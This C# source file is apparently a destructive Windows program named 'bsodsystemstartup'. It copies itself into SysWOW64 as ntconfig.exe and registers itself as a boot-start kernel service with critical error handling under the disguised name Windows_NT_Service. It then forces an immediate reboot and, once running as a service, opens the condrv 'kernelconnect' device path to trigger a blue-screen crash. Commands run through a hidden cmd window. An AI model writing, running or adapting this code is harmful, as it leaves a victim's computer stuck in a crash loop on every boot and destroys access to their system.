using System.IO;
using static bsodsystemstartup.Tools;

namespace bsodsystemstartup
{
    class Program
    {
        static void Main(string[] args)
        {
            static bool RunningAsService()
            {
                var p = ParentProcessUtilities.GetParentProcess();
                return (p != null && p.ProcessName == "services");
            }
            //if (RunningAsService()) File.Copy("\\\\.\\globalroot\\device\\condrv\\kernelconnect", "\\\\.\\globalroot\\device\\condrv\\kernelconnect");
            if (RunningAsService()) RunCmd("\\\\.\\globalroot\\device\\condrv\\kernelconnect");

            string src = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            File.Copy(src, "C:\\Windows\\SysWOW64\\ntconfig.exe");
            RunCmd("sc.exe create ntboot64 binpath= C:\\Windows\\SysWOW64\\ntconfig.exe type= kernel start= boot error= critical displayname= Windows_NT_Service");
            System.Diagnostics.Process.Start("shutdown.exe", "-r -f -t 0");
        }
        private static void RunCmd(string cmd)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo
            {
                WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
                FileName = "cmd.exe",
                Arguments = $"/C {cmd}"
            };
            process.StartInfo = startInfo;
            process.Start();
            process.WaitForExit();
        }
    }
}
